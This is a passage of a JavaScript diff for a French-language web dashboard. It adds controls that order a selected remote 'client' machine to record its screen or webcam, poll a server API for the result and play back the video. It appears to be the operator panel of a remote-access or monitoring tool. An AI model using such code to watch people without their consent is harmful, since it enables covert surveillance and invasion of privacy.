+        showNotification('error', 'Sélectionnez au moins un écran');
+        return;
+    }
+    
+    closeScreenSettingsModal();
+    closeVideoPlayer();
+    
+    document.getElementById('processing-modal').style.display = 'flex';
+    let timer = 0;
+    const timerInterval = setInterval(() => {
+        timer++;
+        document.getElementById('processing-timer').innerText = timer + 's';
+    }, 1000);
+    
+    try {
+        const result = await sendCommandWait(currentClient, 'stream_screen', {
+            duration: settings.duration,
+            monitor: settings.capture_all ? 'all' : (settings.monitors[0] || 0),
+            width: settings.quality,
+            height: settings.quality
+        });
+        
+        clearInterval(timerInterval);
+        document.getElementById('processing-modal').style.display = 'none';
+        
+        if (result && result.success && result.video_data) {
+            showVideoPlayer(result.video_data, `screen_recording_${Date.now()}.mp4`, result);
+            showNotification('success', `${result.duration}s - ${result.frame_count} images (30 FPS)`);
+        } else {
+            showNotification('error', result?.error || 'Échec enregistrement écran');
+        }
+    } catch(e) {
+        clearInterval(timerInterval);
+        document.getElementById('processing-modal').style.display = 'none';
+        showNotification('error', 'Erreur: ' + e.message);
+    }
+}
+
+function downloadFramesAsVideo(streamId) {
+    const timestamp = streamId.replace('screen_', '');
+    const frames = window[`frames_${timestamp}`];
+    if (!frames || frames.length === 0) {
+        showNotification('error', 'Aucune image à télécharger');
+        return;
+    }
+    showNotification('info', `${frames.length} images disponibles (format PNG/JPEG)`);
+}
+
+// WEBCAM
+function openWebcamSettings() {
+    if (!currentClient) { 
+        showNotification('error', 'Sélectionnez un client'); 
+        return;
+    }
+    const modal = document.getElementById('webcam-settings-modal');
+    if (modal) modal.style.display = 'flex';
+    loadWebcams();
+}
+
+async function loadWebcams() {
+    const devices = await detectDevices();
+    const webcamsDiv = document.getElementById('webcams-list');
+    if (!webcamsDiv) return;
+    
+    webcamsDiv.innerHTML = '';
+    
+    devices.webcams?.forEach((cam, idx) => {
+        const div = document.createElement('div');
+        div.className = 'webcam-option';
+        div.innerHTML = `
+            <div class="webcam-preview">📷</div>
+            <span>${escapeHtml(cam.name || `Webcam ${idx+1}`)}</span>
+            <input type="checkbox" class="webcam-checkbox" value="${idx}" id="webcam-${idx}">
+        `;
+        div.onclick = (e) => {
+            e.stopPropagation();
+            const cb = document.getElementById(`webcam-${idx}`);
+            if (cb) {
+                cb.checked = !cb.checked;
+                div.classList.toggle('selected', cb.checked);
+            }
+        };
+        webcamsDiv.appendChild(div);
+    });
+    
+    if (devices.webcams?.length === 0) {
+        webcamsDiv.innerHTML = '<div class="no-data">Aucune webcam détectée</div>';
+    }
+}
+
+function closeWebcamSettingsModal() {
+    const modal = document.getElementById('webcam-settings-modal');
+    if (modal) modal.style.display = 'none';
+}
+
+function getWebcamSettings() {
+    const selectedCams = [];
+    document.querySelectorAll('.webcam-checkbox:checked').forEach(cb => {
+        selectedCams.push(parseInt(cb.value));
+    });
+    
+    const quality = document.querySelector('input[name="webcam-quality"]:checked')?.value || '720p';
+    const qualityMap = { '480p': 480, '720p': 720, '1080p': 1080 };
+    const duration = parseInt(document.getElementById('webcam-duration')?.value) || 30;
+    
+    return {
+        devices: selectedCams,
+        quality: qualityMap[quality],
+        duration: duration
+    };
+}
+
+async function startWebcamStream() {
+    const settings = getWebcamSettings();
+    if (settings.devices.length === 0) {
+        showNotification('error', 'Sélectionnez au moins une webcam');
+        return;
+    }
+    
+    closeWebcamSettingsModal();
+    closeVideoPlayer();
+    
+    document.getElementById('processing-modal').style.display = 'flex';
+    let timer = 0;
+    const timerInterval = setInterval(() => {
+        timer++;
+        document.getElementById('processing-timer').innerText = timer + 's';
+    }, 1000);
+    
+    try {
+        const result = await sendCommandWait(currentClient, 'stream_webcam', {
+            duration: settings.duration,
+            device: settings.devices[0],
+            width: settings.quality,
+            height: settings.quality
+        });
+        
+        clearInterval(timerInterval);
+        document.getElementById('processing-modal').style.display = 'none';
+        
+        if (result && result.success && result.video_data) {
+            showVideoPlayer(result.video_data, `webcam_recording_${Date.now()}.mp4`, result);
+            showNotification('success', `${result.duration}s - ${result.frame_count} images (30 FPS)`);
+        } else {
+            showNotification('error', result?.error || 'Échec enregistrement webcam');
+        }
+    } catch(e) {
+        clearInterval(timerInterval);
+        document.getElementById('processing-modal').style.display = 'none';
+        showNotification('error', 'Erreur: ' + e.message);
+    }
+}
+
+// UTILITAIRES
+function base64ToBlob(base64, mimeType) {
+    if (base64.includes(',')) {
+        base64 = base64.split(',')[1];
+    }
+    const byteCharacters = atob(base64);
+    const byteNumbers = new Array(byteCharacters.length);
+    for (let i = 0; i < byteCharacters.length; i++) {
+        byteNumbers[i] = byteCharacters.charCodeAt(i);
+    }
+    const byteArray = new Uint8Array(byteNumbers);
+    return new Blob([byteArray], { type: mimeType });
+}
+
+async function sendCommandWait(machineId, commandType, params) {
+    const res = await fetch('/api/send_command', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ machine_id: machineId, command_type: commandType, params: params })
+    });
+    const data = await res.json();
+    if (data.command_id) {
+        for (let i = 0; i < 120; i++) {
+            await new Promise(r => setTimeout(r, 1000));
+            const resultRes = await fetch(`/api/command_result/${data.command_id}`);
+            const resultData = await resultRes.json();
+            if (resultData.status === 'executed') {
+                return resultData.result;
+            }
+        }
+    }
+    return null;
+}
+
+// LECTEUR VIDÉO
+function showVideoPlayer(base64Data, filename, metadata) {
+    // Nettoyer l'ancienne vidéo si elle existe
+    const oldVideo = document.getElementById('video-player');
+    if (oldVideo && oldVideo.src) {
+        URL.revokeObjectURL(oldVideo.src);
+    }
+    
+    // Nettoyer l'ancien blob global
+    if (window.currentVideoUrl) {
+        URL.revokeObjectURL(window.currentVideoUrl);
+    }
+    
+    const video = document.getElementById('video-player');
+    const blob = base64ToBlob(base64Data, 'video/mp4');
+    const url = URL.createObjectURL(blob);
+    
+    if (video) {
+        video.src = url;
+        video.load(); // Force le rechargement
+    }
+    
+    window.currentVideoBlob = blob;
+    window.currentVideoFilename = filename;
+    window.currentVideoUrl = url;
+    
+    // Nettoyer les anciennes infos
+    const container = document.getElementById('video-player-container');
+    if (container) {
+        // Supprimer les anciennes infos metadata si présentes
+        const oldInfo = container.querySelector('.video-info');
+        if (oldInfo) oldInfo.remove();
+        
+        if (metadata) {
+            const infoDiv = document.createElement('div');
+            infoDiv.className = 'video-info';
+            infoDiv.style.cssText = 'margin-top: 10px; font-size: 12px; color: var(--text-secondary);';
+            let infoHtml = '';
+            if (metadata.duration) infoHtml += `Durée: ${metadata.duration.toFixed(1)}s | `;
+            if (metadata.fps) infoHtml += `FPS: ${metadata.fps} | `;
+            if (metadata.frame_count) infoHtml += `Images: ${metadata.frame_count} | `;
+            if (metadata.width && metadata.height) infoHtml += `Résolution: ${metadata.width}x${metadata.height}`;
+            infoDiv.innerHTML = infoHtml;
+            container.appendChild(infoDiv);
+        }
+    }
+    
+    const modal = document.getElementById('video-player-modal');
+    if (modal) modal.style.display = 'flex';
+}
+
+function closeVideoPlayer() {
+    if (window.currentVideoUrl) {
+        URL.revokeObjectURL(window.currentVideoUrl);
+        window.currentVideoUrl = null;
+    }
+    window.currentVideoBlob = null;
+    window.currentVideoFilename = null;
+    
+    const video = document.getElementById('video-player');
+    if (video) {
+        video.pause();
+        video.src = '';
+        video.load();
+    }
+    
+    // Nettoyer les infos metadata
+    const container = document.getElementById('video-player-container');
+    if (container) {
+        const oldInfo = container.querySelector('.video-info');
+        if (oldInfo) oldInfo.remove();
+    }
+    
+    const modal = document.getElementById('video-player-modal');
+    if (modal) modal.style.display = 'none';
+}
+
+function downloadVideo() {
+    if (window.currentVideoBlob) {
+        const url = URL.createObjectURL(window.currentVideoBlob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = window.currentVideoFilename || 'recording.mp4';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        setTimeout(() => URL.revokeObjectURL(url), 100);
+        showNotification('success', 'Téléchargement démarré');
+    } else {
+        showNotification('error', 'Aucune vidéo à télécharger');
+    }
+}
+
+function copyVideoToClipboard() {
+    if (window.currentVideoUrl) {
+        navigator.clipboard.writeText(window.currentVideoUrl);
+        showNotification('success', 'Lien copié');
+    }
+}
 
 // ========== INIT ==========
 loadStats();
@@ -1272,7 +2136,7 @@ updateConnectionStatus();
 setInterval(() => {
     loadStats();
     loadRecentClients();
-    if (document.getElementById('clients-page').classList.contains('active')) {
+    if (document.getElementById('clients-page')?.classList.contains('active')) {
         loadClients();
     }
 }, 10000);
